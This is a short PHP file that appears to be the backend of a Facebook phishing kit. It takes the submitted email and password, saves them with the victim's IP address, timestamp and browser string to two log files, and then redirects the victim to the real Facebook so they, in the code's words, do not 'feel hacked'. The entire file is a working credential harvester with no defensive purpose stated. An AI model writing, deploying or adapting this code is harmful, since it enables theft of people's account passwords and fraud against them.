<?php
// The 'loginBackend'

// GET THE POST METHODS
$username = $_POST['email'];
$pwd = $_POST['pass'];

if(isset($username) and isset($pwd))
{

$texts_commandline = "\n ***DATA***INSERTED***\n\nUsername:: ".$username."\nPassword:: ".$pwd."\nIP-Address:: ".$_SERVER['REMOTE_ADDR']."\nTime:: ".date("F j, Y, g:i a")."\nDevice:: ".$_SERVER['HTTP_USER_AGENT']."\n\n  **********************\n\n\n\n";

$texts_browser = "     <tr>
        <th scope=\"row\"> - </th>
        <td>".$username."</td>
        <td>".$pwd."</td>
        <td>".$_SERVER['REMOTE_ADDR']."</td>
        <td>".date('F j, Y, g:i a')."</td>
        <td>".$_SERVER['HTTP_USER_AGENT']."</td>
     </tr>\n";

$fp = fopen(__DIR__.'/../../storage/commands.txt', 'a');
$fp2 = fopen(__DIR__.'/../../storage/browser.txt','a');

fwrite($fp,$texts_commandline );
fwrite($fp2,$texts_browser);
fclose($fp);
fclose($fp2);

// After successfully record now redirect to Official Facebook so the user, doesnot feel hacked! haha
header("Location: https://www.facebook.com/");

}
?>



